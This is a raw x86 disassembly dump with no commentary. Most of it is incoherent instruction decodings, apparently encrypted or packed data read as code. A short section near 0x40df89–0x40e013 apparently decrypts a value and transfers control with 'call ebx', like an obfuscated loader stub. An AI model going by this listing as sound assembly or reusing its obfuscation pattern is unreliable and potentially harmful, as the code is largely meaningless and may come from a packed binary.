  40da13:	and    bh,bl
  40da15:	outs   dx,BYTE PTR ds:[esi]
  40da16:	mov    bh,0xe5
  40da18:	push   ebp
  40da19:	lock adc dh,al
  40da1c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40da1e:	sub    edi,eax
  40da20:	mov    ebx,0x6ab9f862
  40da25:	sub    BYTE PTR [ebx+0x13],ah
  40da28:	shr    BYTE PTR [ebp+0x6c],cl
  40da2b:	loop   0x40da70
  40da2d:	sub    dl,bh
  40da2f:	aaa    
  40da30:	ja     0x40d9de
  40da32:	cli    
  40da33:	js     0x40da65
  40da35:	js     0x40da63
  40da37:	mov    esi,0xde80e7bd
  40da3c:	nop
  40da3d:	lods   eax,DWORD PTR ds:[esi]
  40da3e:	ins    DWORD PTR es:[edi],dx
  40da3f:	add    ebx,DWORD PTR [edx-0x19]
  40da42:	dec    edi
  40da43:	mov    ds:0xbf5eea4f,al
  40da48:	stos   BYTE PTR es:[edi],al
  40da49:	adc    dh,BYTE PTR [ecx-0x4a]
  40da4c:	mov    ch,0xc0
  40da4e:	out    dx,al
  40da4f:	test   eax,0x183a9127
  40da54:	adc    BYTE PTR [edx-0x5cf25e1a],dl
  40da5a:	ror    ebx,1
  40da5c:	retf   
  40da5d:	inc    ebp
  40da5e:	sub    ebx,esi
  40da60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da61:	mov    dl,0x45
  40da63:	xchg   ebx,eax
  40da64:	std    
  40da65:	xchg   ecx,eax
  40da66:	xchg   ebx,eax
  40da67:	jl     0x40da9b
  40da69:	ins    BYTE PTR es:[edi],dx
  40da6a:	or     al,0x23
  40da6c:	out    dx,al
  40da6d:	popa   
  40da6e:	sub    eax,0x8545026a
  40da73:	das    
  40da74:	push   esp
  40da75:	mov    edx,0xc46e52
  40da7a:	mov    DWORD PTR [edi],eax
  40da7c:	pusha  
  40da7d:	pushf  
  40da7e:	mov    ds:0x139d844c,eax
  40da83:	jp     0x40db01
  40da85:	jns    0x40da73
  40da87:	or     DWORD PTR [ecx],0x7438f40c
  40da8d:	les    esp,FWORD PTR [esp+edi*4-0x114368c0]
  40da94:	mov    eax,ds:0xb0adac68
  40da99:	inc    ebp
  40da9a:	xchg   al,bh
  40da9c:	sub    ecx,ecx
  40da9e:	mov    dl,0xfd
  40daa0:	push   0x7
  40daa2:	jmp    0x40da33
  40daa4:	xchg   esp,eax
  40daa5:	imul   BYTE PTR [edi]
  40daa7:	and    bh,BYTE PTR [ebp-0x5d3637a2]
  40daad:	mov    esp,esi
  40daaf:	push   edi
  40dab0:	xchg   ebx,eax
  40dab1:	ror    DWORD PTR [edx-0x71],0x5c
  40dab5:	xchg   edx,eax
  40dab6:	mov    cl,0x20
  40dab8:	loope  0x40db11
  40daba:	pushf  
  40dabb:	pop    eax
  40dabc:	xor    DWORD PTR ds:0xcba5df26,0x7b
  40dac3:	mov    di,0x7736
  40dac7:	xchg   DWORD PTR [esi-0x14244fda],eax
  40dacd:	sbb    ecx,0xfffffff2
  40dad0:	mov    ch,0x5f
  40dad2:	repnz mov ah,0x50
  40dad5:	push   ecx
  40dad6:	pop    esp
  40dad7:	ret    0xbf3c
  40dada:	or     eax,0x61cb6b81
  40dadf:	lods   al,BYTE PTR ds:[esi]
  40dae0:	out    dx,eax
  40dae1:	aad    0xbb
  40dae3:	cmc    
  40dae4:	out    0xf9,eax
  40dae6:	fcomp  QWORD PTR [ebp+0x6e]
  40dae9:	or     edi,DWORD PTR [eax+0x650f78b2]
  40daef:	sub    BYTE PTR [esi],al
  40daf1:	jbe    0x40dabf
  40daf3:	inc    ebp
  40daf4:	mov    bl,0x6d
  40daf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf8:	fdivr  QWORD PTR [esi+0x3428cfa4]
  40dafe:	cmp    edx,esp
  40db00:	mov    dl,0xd7
  40db02:	scas   eax,DWORD PTR es:[edi]
  40db03:	jg     0x40db6b
  40db05:	pushf  
  40db06:	mov    dh,0x45
  40db08:	popf   
  40db09:	push   ss
  40db0a:	or     esi,DWORD PTR [ecx+0x28]
  40db0d:	lods   al,BYTE PTR ds:[esi]
  40db0e:	inc    edx
  40db0f:	dec    ebx
  40db10:	test   DWORD PTR [edx],0xde4fc7b0
  40db16:	mov    ebp,0xdd07e1f4
  40db1b:	adc    ebp,DWORD PTR [esi+0x243a5138]
  40db21:	imul   edi,DWORD PTR [eax-0x62],0x5d
  40db25:	lea    esp,[esi-0x43e0ef69]
  40db2b:	adc    BYTE PTR [edx+0x5],ah
  40db2e:	jl     0x40dafa
  40db30:	add    ah,BYTE PTR [edi]
  40db32:	mov    ebp,DWORD PTR [edi+0x1]
  40db35:	inc    ebx
  40db36:	dec    ebp
  40db37:	dec    edx
  40db38:	call   0x7e353fcf
  40db3d:	adc    eax,0xd1741d96
  40db42:	lods   al,BYTE PTR ds:[esi]
  40db43:	stos   BYTE PTR es:[edi],al
  40db44:	out    dx,eax
  40db45:	pusha  
  40db46:	out    0x9a,al
  40db48:	inc    edi
  40db49:	or     al,0x14
  40db4b:	(bad)  
  40db4c:	fidiv  WORD PTR ds:0x67bb067e
  40db52:	mov    WORD PTR [esi],?
  40db54:	in     al,0xd7
  40db56:	adc    al,0x49
  40db58:	xor    al,0x88
  40db5a:	mov    bl,ch
  40db5c:	ret    0x4fec
  40db5f:	jno    0x40dbc7
  40db61:	xchg   ebp,eax
  40db62:	neg    DWORD PTR [esi]
  40db64:	jb     0x40daf5
  40db66:	push   ss
  40db67:	ins    BYTE PTR es:[edi],dx
  40db68:	add    bl,dh
  40db6a:	inc    ebx
  40db6b:	(bad)  
  40db6c:	and    al,0x2
  40db6e:	ins    DWORD PTR es:[edi],dx
  40db6f:	ffreep st(6)
  40db71:	dec    esi
  40db72:	inc    ebx
  40db73:	gs bnd jns 0x40db9d
  40db77:	in     al,0x2f
  40db79:	cmp    eax,0xbbbb66b9
  40db7e:	and    al,0x51
  40db80:	or     al,0xc7
  40db82:	or     DWORD PTR [esi+0x59],0x6c784ecf
  40db89:	mov    ds:0x85210ff3,al
  40db8e:	aam    0x69
  40db90:	callw  0xc29a
  40db94:	leave  
  40db95:	jno    0x40dbad
  40db97:	mov    ebx,0x62cbcef4
  40db9c:	inc    edx
  40db9d:	(bad)  
  40db9e:	iret   
  40db9f:	mov    ds:0xa8786aee,al
  40dba4:	add    dh,BYTE PTR [edx-0x6cb2344d]
  40dbaa:	mov    ebx,0x1da377ea
  40dbaf:	shr    edi,1
  40dbb1:	fisttp QWORD PTR [edx+0x77]
  40dbb4:	mov    al,0x20
  40dbb6:	aaa    
  40dbb7:	hlt    
  40dbb8:	cmc    
  40dbb9:	addr16 mov tr5,ebx
  40dbbd:	hlt    
  40dbbe:	aas    
  40dbbf:	inc    edx
  40dbc0:	xchg   esp,eax
  40dbc1:	sub    ecx,DWORD PTR [esi-0x5493bfbd]
  40dbc7:	mov    eax,ds:0xfb05ca3
  40dbcc:	add    esp,DWORD PTR [esi+0x5]
  40dbcf:	inc    edx
  40dbd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbd1:	xchg   ah,bh
  40dbd3:	sar    dl,cl
  40dbd5:	cmp    al,0xd3
  40dbd7:	imul   esp,DWORD PTR [ebx],0x526fe758
  40dbdd:	iret   
  40dbde:	and    al,BYTE PTR [eax+0x1e5f825]
  40dbe4:	iret   
  40dbe5:	popa   
  40dbe6:	add    esi,ebx
  40dbe8:	sub    DWORD PTR [edi-0x3e],edi
  40dbeb:	xor    esi,esp
  40dbed:	dec    eax
  40dbee:	leave  
  40dbef:	cmc    
  40dbf0:	and    esp,ebx
  40dbf2:	push   esi
  40dbf3:	dec    esi
  40dbf4:	jns    0x40dbc0
  40dbf6:	jae    0x40dbf6
  40dbf8:	push   ebp
  40dbf9:	sub    bl,dl
  40dbfb:	out    0x7,al
  40dbfd:	pop    ebp
  40dbfe:	sub    eax,0x587b26df
  40dc03:	ins    DWORD PTR es:[edi],dx
  40dc04:	aad    0xc1
  40dc06:	mov    BYTE PTR [ebx+eax*4+0x23077195],dh
  40dc0d:	sbb    eax,0x43eca4ab
  40dc12:	mov    eax,ds:0xd1383b17
  40dc17:	add    DWORD PTR [eax-0x5e1ab5ff],edx
  40dc1d:	retf   0xdcb8
  40dc20:	push   cs
  40dc21:	aas    
  40dc22:	fidivr WORD PTR [edi]
  40dc24:	inc    edx
  40dc25:	popa   
  40dc26:	mov    al,0xe0
  40dc28:	jnp    0x40dc4b
  40dc2a:	ds retf 
  40dc2c:	js     0x40dc4f
  40dc2e:	(bad)
  40dc32:	pop    edx
  40dc33:	jae    0x40dc62
  40dc35:	mov    ds:0x13acf16b,al
  40dc3a:	div    DWORD PTR [edx]
  40dc3c:	aas    
  40dc3d:	out    dx,eax
  40dc3e:	jns    0x40dca2
  40dc40:	mov    ebp,0x84ec6669
  40dc45:	cmp    ch,BYTE PTR [edi]
  40dc47:	xchg   esp,eax
  40dc48:	adc    eax,0x95e98ae8
  40dc4d:	out    dx,eax
  40dc4e:	mov    ebx,0x85a83f70
  40dc53:	xchg   edi,eax
  40dc54:	popf   
  40dc55:	sub    bl,BYTE PTR [eax-0x76]
  40dc58:	xchg   ebx,eax
  40dc59:	adc    eax,0xa5a93aaa
  40dc5e:	xor    BYTE PTR [edi+0x2b],ah
  40dc61:	and    ecx,DWORD PTR [ebx-0x15]
  40dc64:	mov    edx,DWORD PTR [ebp+0x8]
  40dc67:	mov    edi,DWORD PTR [ebp-0x24]
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8+0x20fdc898]
  40dc7d:	push   cs
  40dc7e:	test   al,0x35
  40dc80:	call   0x7e7e:0x7d7d7e7e
  40dc87:	bound  edi,QWORD PTR [ecx-0x1418704f]
  40dc8d:	enter  0x2a33,0x34
  40dc91:	lods   al,BYTE PTR ds:[esi]
  40dc92:	sub    bh,BYTE PTR [eax+ebp*8+0x44]
  40dc96:	test   DWORD PTR [ecx-0x21],edx
  40dc99:	popa   
  40dc9a:	sti    
  40dc9b:	(bad)  
  40dc9c:	pop    edi
  40dc9d:	imul   ebx,DWORD PTR [ebx-0x3a7c73c6],0x818b63b0
  40dca7:	push   0xd5f8c6a9
  40dcac:	xor    esi,esp
  40dcae:	sub    al,0xdd
  40dcb0:	cdq    
  40dcb1:	dec    eax
  40dcb2:	jmp    0x5ac9:0x4d167a75
  40dcb9:	push   ebx
  40dcba:	xor    ebx,DWORD PTR [edi+edx*4]
  40dcbd:	repnz retf 
  40dcbf:	xor    eax,0x14dfa28e
  40dcc4:	mov    esi,0xa9f96598
  40dcc9:	retf   0x648c
  40dccc:	adc    BYTE PTR [esi+eax*8+0x5a0a2943],dh
  40dcd3:	aad    0x23
  40dcd5:	add    al,0x6
  40dcd7:	pop    ecx
  40dcd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcd9:	sbb    BYTE PTR [eax+0x2d],al
  40dcdc:	out    0xd7,eax
  40dcde:	cwde   
  40dcdf:	clc    
  40dce0:	inc    ecx
  40dce1:	scas   al,BYTE PTR es:[edi]
  40dce2:	dec    edi
  40dce3:	adc    al,0x6f
  40dce5:	ror    BYTE PTR [eax+ebp*4+0x695dd7ac],cl
  40dcec:	mov    edi,0x2df1becc
  40dcf1:	pop    esp
  40dcf2:	mov    dl,0xc2
  40dcf4:	mov    ch,0xdf
  40dcf6:	in     eax,dx
  40dcf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcf8:	or     DWORD PTR [esp+ebx*1],0xffffffa6
  40dcfc:	mov    esp,0xdc52bc3b
  40dd01:	jp     0x40dd4e
  40dd03:	sahf   
  40dd04:	xchg   edx,eax
  40dd05:	sub    eax,0xc38797c0
  40dd0a:	test   BYTE PTR [edi-0xa4d46c],dl
  40dd10:	jo     0x40dcce
  40dd12:	mov    bh,0x2
  40dd14:	cld    
  40dd15:	mov    ebp,0xaa7ce939
  40dd1a:	pop    edi
  40dd1b:	or     DWORD PTR [ebx+eax*8+0x4943eb01],ecx
  40dd22:	and    al,0x76
  40dd24:	xor    eax,0xaa8468e2
  40dd29:	js     0x40dd8e
  40dd2b:	pop    es
  40dd2c:	xlat   BYTE PTR ds:[ebx]
  40dd2d:	push   es
  40dd2e:	jnp    0x40dd9c
  40dd30:	jmp    0x40dd2b
  40dd32:	and    eax,0xfe5728f2
  40dd37:	inc    edi
  40dd38:	es xchg esi,eax
  40dd3a:	rol    DWORD PTR [ebx+ebp*4],1
  40dd3d:	mov    edx,0x80dc6f47
  40dd42:	sub    ch,BYTE PTR [eax-0x6fb44d93]
  40dd48:	test   al,0x52
  40dd4a:	fadd   QWORD PTR [eax+eiz*4-0x12a80689]
  40dd51:	mov    dl,0x2e
  40dd53:	jle    0x40dcd7
  40dd55:	cld    
  40dd56:	inc    edi
  40dd57:	sub    eax,esp
  40dd59:	add    edi,ebp
  40dd5b:	cld    
  40dd5c:	jnp    0x40dd4a
  40dd5e:	cmp    dh,dl
  40dd60:	leave  
  40dd61:	rcr    dl,0xba
  40dd64:	and    DWORD PTR [eax+0x29323385],edi
  40dd6a:	inc    ecx
  40dd6b:	jnp    0x40dde3
  40dd6d:	out    dx,eax
  40dd6e:	and    ecx,DWORD PTR [edi-0x5b]
  40dd71:	jae    0x40ddc5
  40dd73:	sbb    al,0x29
  40dd75:	push   edx
  40dd76:	fwait
  40dd77:	ror    DWORD PTR [ebp+0x1cc7d51b],1
  40dd7d:	pop    ebx
  40dd7e:	jle    0x40dd83
  40dd80:	loope  0x40dd0b
  40dd82:	jbe    0x40dd50
  40dd84:	(bad)  
  40dd85:	pop    ebp
  40dd86:	dec    edi
  40dd87:	push   cs
  40dd88:	hlt    
  40dd89:	xor    DWORD PTR [eax*8-0x4ecbdace],ebp
  40dd90:	outs   dx,DWORD PTR ds:[esi]
  40dd91:	bound  esp,QWORD PTR [ebp+0x71]
  40dd94:	aaa    
  40dd95:	mov    dl,0x3e
  40dd97:	jle    0x40dd24
  40dd99:	pop    edi
  40dd9a:	ins    DWORD PTR es:[edi],dx
  40dd9b:	mov    al,0xd3
  40dd9d:	in     eax,dx
  40dd9e:	mov    BYTE PTR [edx*1-0xbb10544],dh
  40dda5:	pop    esp
  40dda6:	leave  
  40dda7:	sub    BYTE PTR [edi+ebp*4],bl
  40ddaa:	fdivr  QWORD PTR [ebx+0x2]
  40ddad:	xor    bh,BYTE PTR [ebp+0x2c]
  40ddb0:	mov    esp,0xbb142f2c
  40ddb5:	inc    esi
  40ddb6:	pop    edi
  40ddb7:	mov    ch,0x37
  40ddb9:	push   cs
  40ddba:	or     edi,DWORD PTR [edx-0x21]
  40ddbd:	mov    esi,0xee25e7a9
  40ddc2:	or     eax,0x119ee1ef
  40ddc7:	push   cs
  40ddc8:	test   eax,0xcef60407
  40ddcd:	lods   eax,DWORD PTR ds:[esi]
  40ddce:	loopne 0x40dd82
  40ddd0:	mov    gs,WORD PTR [ebx+0x4e14c649]
  40ddd6:	call   0x5f5fe368
  40dddb:	fist   DWORD PTR cs:[ecx-0x37579888]
  40dde2:	das    
  40dde3:	xchg   edx,eax
  40dde4:	ror    BYTE PTR [eax*2-0x7f519470],cl
  40ddeb:	psllq  mm1,QWORD PTR [eax+ebp*4-0x34]
  40ddf0:	stc    
  40ddf1:	mov    ds:0xfea6cca3,eax
  40ddf6:	mov    esp,0xfae23086
  40ddfb:	mov    dl,0xcd
  40ddfd:	(bad)  
  40ddfe:	rcr    esp,1
  40de00:	xchg   esp,eax
  40de01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de02:	jo     0x40ddd5
  40de04:	push   ebx
  40de05:	aad    0x2d
  40de07:	cwde   
  40de08:	sub    al,BYTE PTR [edx+0x242bf152]
  40de0e:	jbe    0x40dda6
  40de10:	cmp    esi,DWORD PTR [ebx]
  40de12:	xchg   ecx,eax
  40de13:	pusha  
  40de14:	adc    esp,DWORD PTR [edx+0x4e]
  40de17:	add    ch,BYTE PTR [ebp+0x69]
  40de1a:	dec    esi
  40de1b:	cld    
  40de1c:	jmp    0x23c2:0xf40e12db
  40de23:	shl    BYTE PTR [ebx-0x6f],cl
  40de26:	push   edi
  40de27:	mov    ds:0x438f395d,eax
  40de2c:	pop    ds
  40de2d:	sbb    eax,0xe5c9ed85
  40de32:	iret   
  40de33:	sbb    esi,DWORD PTR [eax+0x4d]
  40de36:	(bad)  
  40de37:	repz mov edx,0x399ca11
  40de3d:	sub    DWORD PTR [eax+edi*4-0x7e],edx
  40de41:	pop    esp
  40de42:	and    edx,DWORD PTR [ebp-0x12f45d27]
  40de48:	inc    ebx
  40de4a:	aam    0x24
  40de4c:	jno    0x40de1f
  40de4e:	mov    ebp,0xa877b53e
  40de53:	dec    ebx
  40de54:	pop    ebp
  40de55:	icebp  
  40de56:	cli    
  40de57:	xlat   BYTE PTR ds:[ebx]
  40de58:	nop
  40de59:	dec    edi
  40de5a:	imul   esp,DWORD PTR [ecx+0x3284de61],0x8f021e6b
  40de64:	mov    ch,BYTE PTR [ecx+eiz*2]
  40de67:	push   0x59
  40de69:	mov    ?,WORD PTR [edi+0x77]
  40de6c:	into   
  40de6d:	int3   
  40de6e:	dec    esp
  40de6f:	or     DWORD PTR [ecx+0x7c],ecx
  40de72:	jno    0x40de44
  40de74:	inc    esi
  40de75:	lea    ecx,[esi]
  40de77:	imul   ebx,DWORD PTR [eax-0x3c],0xffffffc0
  40de7b:	adc    DWORD PTR [edx+0x2f],0x65ad5791
  40de82:	push   ecx
  40de83:	mov    al,0x97
  40de85:	lock and eax,0xf5026654
  40de8b:	or     BYTE PTR [edi-0x4ad698a9],bh
  40de91:	pop    DWORD PTR [ebp+0x43]
  40de94:	push   edi
  40de95:	rcr    DWORD PTR [ebx],0x62
  40de98:	(bad)  
  40de99:	(bad)  
  40de9a:	jge    0x40de76
  40de9c:	rol    DWORD PTR [esp+ebp*1],cl
  40de9f:	mov    esp,0x3839cf45
  40dea4:	cmp    DWORD PTR [ecx+edx*1+0x62],ebp
  40dea8:	jae    0x40dec7
  40deaa:	or     BYTE PTR [edx],0xc0
  40dead:	xchg   edi,eax
  40deae:	daa    
  40deaf:	ss jle 0x40dee8
  40deb2:	xchg   ecx,eax
  40deb3:	add    DWORD PTR [ebx+0x2b],esi
  40deb6:	push   ds
  40deb7:	push   esp
  40deb8:	jge    0x40dec5
  40deba:	sub    BYTE PTR [edi+0x2f84bb32],ch
  40dec0:	mov    ds:0x7ac3abd4,eax
  40dec5:	or     eax,0x617f6088
  40deca:	mov    cl,0x32
  40decc:	clc    
  40decd:	(bad)  
  40decf:	add    edx,DWORD PTR [ecx]
  40ded1:	out    dx,eax
  40ded2:	pop    edx
  40ded3:	sbb    BYTE PTR [ebp+0x13],ch
  40ded6:	mov    edi,0xcbee4d7b
  40dedb:	idiv   DWORD PTR [ecx+0x50b40153]
  40dee1:	(bad)  
  40dee2:	mov    al,cl
  40dee4:	dec    edi
  40dee5:	fld    DWORD PTR [ecx-0x44]
  40dee8:	xor    edi,DWORD PTR [eax+0x4b]
  40deeb:	leave  
  40deec:	push   edx
  40deed:	js     0x24d3dd39
  40def3:	(bad)
  40def6:	test   DWORD PTR [ecx-0xc5d0169],ecx
  40defc:	dec    eax
  40defd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40defe:	mov    ah,0xd9
  40df00:	mov    edx,0x6f63e0cf
  40df05:	push   ecx
  40df06:	push   edi
  40df07:	and    DWORD PTR [esi+esi*8],edx
  40df0a:	xor    BYTE PTR [edx],0x4a
  40df0d:	mov    ah,0xac
  40df0f:	mov    ch,0x39
  40df11:	cmp    eax,0xe41c664
  40df16:	push   0x5e
  40df18:	scas   al,BYTE PTR es:[edi]
  40df19:	mov    DWORD PTR [ecx+0x3cc0ea50],edi
  40df1f:	out    0xf6,al
  40df21:	cwde   
  40df22:	inc    edx
  40df23:	dec    ebx
  40df24:	scas   al,BYTE PTR es:[edi]
  40df25:	jno    0x40df77
  40df27:	and    DWORD PTR [esi+0x73],0xf2569d32
  40df2e:	lahf   
  40df2f:	fimul  WORD PTR [eax+0x5b]
  40df32:	push   ds
  40df33:	pop    esp
  40df34:	ds push esp
  40df36:	sbb    eax,0xf4d1f8ea
  40df3b:	mov    edx,0xb3a597f3
  40df40:	fld    QWORD PTR [ecx-0x65027980]
  40df46:	xchg   ebp,eax
  40df47:	jge    0x40df87
  40df49:	jmp    0x4502:0xb114c1fb
  40df50:	dec    esp
  40df52:	push   ebp
  40df53:	adc    al,0xfc
  40df55:	out    0x8c,eax
  40df57:	lea    edx,[ecx-0x39]
  40df5a:	in     al,dx
  40df5b:	out    0xba,al
  40df5d:	(bad)  
  40df5f:	fild   QWORD PTR [edi-0x6421f721]
  40df65:	clc    
  40df66:	sub    eax,0xac5a6c6f
  40df6b:	cmc    
  40df6c:	or     al,0x8d
  40df6e:	fstp   DWORD PTR [edi+0x19f94ac9]
  40df74:	jecxz  0x40defa
  40df76:	inc    edx
  40df77:	mov    dl,0x9a
  40df79:	jne    0x40df94
  40df7b:	pop    ds
  40df7c:	lea    ecx,[edi+ebx*4+0x78]
  40df80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df81:	or     al,0xd4
  40df83:	mov    al,BYTE PTR [edi-0x30]
  40df86:	retf   0x6ee9
  40df89:	test   DWORD PTR [ecx+0x458b9704],0x8558be8
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	cs (bad) 
  40e025:	jb     0x40e067
  40e027:	xor    esi,DWORD PTR [eax]
  40e029:	cdq    
  40e02a:	jle    0x40e0aa
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	(bad)  
  40e031:	cmc    
  40e032:	out    0xb,eax
  40e034:	cdq    
  40e035:	jmp    0xe93ff25c
  40e03a:	loop   0x40e045
  40e03c:	enter  0xc411,0x5c
  40e040:	addr16 adc esp,0xca979a5e
  40e047:	fst    QWORD PTR [esi+0x11370670]
  40e04d:	add    cl,BYTE PTR [ecx]
  40e04f:	in     eax,dx
  40e050:	inc    edx
  40e051:	cmp    dl,al
  40e053:	(bad)  
  40e054:	ins    DWORD PTR es:[edi],dx
  40e055:	jbe    0x40e0a4
  40e057:	enter  0x4c88,0x59
  40e05b:	mov    WORD PTR [esi+0x364e7028],ds
  40e061:	mov    cl,0xe
  40e063:	sub    eax,0x355bf31b
  40e068:	cmp    bh,BYTE PTR [edx+ecx*2-0x735f44db]
  40e06f:	js     0x40e061
  40e071:	gs aam 0xb0
  40e074:	push   esi
  40e075:	pop    ebx
  40e076:	sub    ebp,DWORD PTR [edi]
  40e078:	add    ch,BYTE PTR [eax-0x702617c7]
  40e07e:	jns    0x40e00a
  40e080:	pop    edi
  40e081:	pop    ss
  40e082:	adc    edx,DWORD PTR [esi-0x3e]
  40e085:	inc    eax
  40e086:	(bad)  
  40e088:	mov    dl,0x3f
  40e08a:	mov    ds:0x6aac384a,al
  40e08f:	ret    0x732d
  40e092:	pop    esi
  40e093:	xor    dh,BYTE PTR [esi-0x1c]
  40e096:	rcr    ebx,0x5a
  40e099:	push   0xffffffc3
  40e09b:	mov    esp,0x65d1ae12
  40e0a0:	mov    ah,0xd3
  40e0a2:	test   eax,0x17ece184
  40e0a7:	xchg   edx,eax
  40e0a8:	daa    
  40e0a9:	push   ss
  40e0aa:	dec    esp
  40e0ab:	and    edi,DWORD PTR [ebp-0x4b7a4150]
  40e0b1:	xchg   ecx,eax
  40e0b2:	cmp    BYTE PTR [ebp+ecx*4-0x2],ch
  40e0b6:	test   DWORD PTR [edi-0x6246e18e],0x189ff903
  40e0c0:	(bad)  
  40e0c1:	cwde   
  40e0c2:	dec    ebp
  40e0c3:	out    dx,eax
  40e0c4:	fcom   DWORD PTR [ebx]
  40e0c6:	(bad)  
  40e0c7:	cli    
  40e0c8:	pop    esp
  40e0c9:	inc    edi
  40e0ca:	mov    eax,ds:0x46454434
  40e0cf:	sbb    al,BYTE PTR [esi]
  40e0d1:	fcom   QWORD PTR [eax-0x554b1524]
  40e0d7:	adc    al,0x1
  40e0d9:	inc    edi
  40e0da:	ins    DWORD PTR es:[edi],dx
  40e0db:	int3   
  40e0dc:	mov    ds:0x5fec7670,eax
  40e0e1:	sub    edi,DWORD PTR [ecx+0x6a]
  40e0e4:	and    dh,dh
  40e0e6:	ins    DWORD PTR es:[edi],dx
  40e0e7:	repnz imul esi,eax,0xffffffaa
  40e0eb:	ds mov esp,0x9a1eea9b
  40e0f1:	cmp    eax,0xc593a4b
  40e0f6:	pushf  
  40e0f7:	(bad)  
  40e0f8:	ror    BYTE PTR [esi-0x64],1
  40e0fb:	adc    dl,BYTE PTR [edi-0x50ba060]
  40e101:	jmp    0x2018:0x1bef34a7
  40e108:	dec    eax
  40e109:	cli    
  40e10a:	mov    BYTE PTR [ebp+0x5763e551],ah
  40e110:	add    dl,BYTE PTR [edi-0x7d]
  40e113:	mov    ecx,0x3644b2f5
  40e118:	pop    ebx
  40e119:	clc    
  40e11a:	dec    eax
  40e11b:	call   0xcaa0738a
  40e120:	sbb    eax,0x6bb383b0
  40e125:	cmp    al,0x9e
  40e127:	jge    0x40e16c
  40e129:	dec    ebp
  40e12a:	or     DWORD PTR [ecx],ebx
  40e12c:	sbb    al,0x9
  40e12e:	lods   al,BYTE PTR fs:[esi]
  40e130:	push   eax
  40e131:	xor    dl,BYTE PTR [edx+0x5c6d6386]
  40e137:	inc    ecx
  40e138:	icebp  
  40e139:	cmp    BYTE PTR ds:0x93bdcae4,ah
  40e13f:	xor    ch,BYTE PTR [ebx-0x14de7cd9]
  40e145:	xchg   edi,eax
  40e146:	mov    ch,BYTE PTR ds:0x4a5f869f
  40e14c:	(bad)  
  40e14e:	push   ebp
  40e14f:	leave  
  40e150:	out    0x6,eax
  40e152:	fprem  
  40e154:	mov    ebp,0xe2e72070
  40e159:	in     eax,dx
  40e15a:	push   ss
  40e15b:	(bad)  
  40e15c:	es inc eax
  40e15e:	dec    edi
  40e15f:	xlat   BYTE PTR ds:[ebx]
  40e160:	lock dec esp
  40e162:	xor    eax,0xc8c1c828
  40e167:	xchg   esp,eax
  40e168:	cmp    DWORD PTR [ebp+edx*8-0x75],edi
  40e16c:	jns    0x40e1bd
  40e16e:	xchg   ecx,eax
  40e16f:	mov    ch,0xc
  40e171:	add    ebp,ebp
  40e173:	add    al,0x74
  40e175:	stos   BYTE PTR es:[edi],al
  40e176:	inc    eax
  40e177:	lahf   
  40e178:	xchg   esp,eax
  40e179:	mov    esi,DWORD PTR [eax-0x7b]
  40e17c:	hlt    
  40e17d:	sub    DWORD PTR ds:0x6eb043b2,ebx
  40e183:	pop    ss
  40e184:	xchg   ebp,eax
  40e185:	ja     0x40e1f3
  40e187:	dec    ecx
  40e188:	shr    BYTE PTR [edx-0x13],0x54
  40e18c:	and    al,0xa4
  40e18e:	mov    esp,0x6a949cd9
  40e193:	mov    ds:0xc952c595,al
  40e198:	xor    BYTE PTR [edx+edx*2],cl
  40e19b:	rol    BYTE PTR [ecx+ebp*4+0x16],1
  40e19f:	rcl    DWORD PTR [esi-0x2e],1
  40e1a2:	data16 fisttp QWORD PTR [esi-0x4e1b24c7]
  40e1a9:	jecxz  0x40e1f7
  40e1ab:	iret   
  40e1ac:	scas   al,BYTE PTR es:[edi]
  40e1ad:	dec    edi
  40e1ae:	xchg   ebp,eax
